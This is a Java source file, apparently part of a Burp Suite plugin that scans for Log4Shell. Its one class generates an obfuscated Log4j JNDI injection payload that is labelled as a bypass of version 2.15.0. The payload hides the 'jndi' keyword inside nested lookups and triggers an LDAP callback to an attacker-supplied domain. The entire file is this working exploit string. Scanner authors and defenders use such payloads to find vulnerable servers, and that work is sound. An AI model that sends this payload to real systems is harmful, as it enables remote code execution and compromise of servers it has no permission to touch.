package burp.poc.impl;

// 2.15.0 bypass

import burp.poc.IPOC;
import burp.utils.Utils;

public class POC18 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}}ldap://127.0.0.1#" + domain + "/" + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}";
    }

    @Override
    public int getType() {
        return POC_TYPE_LDAP;
    }

    @Override
    public int getIndex() {
        return 18;
    }
}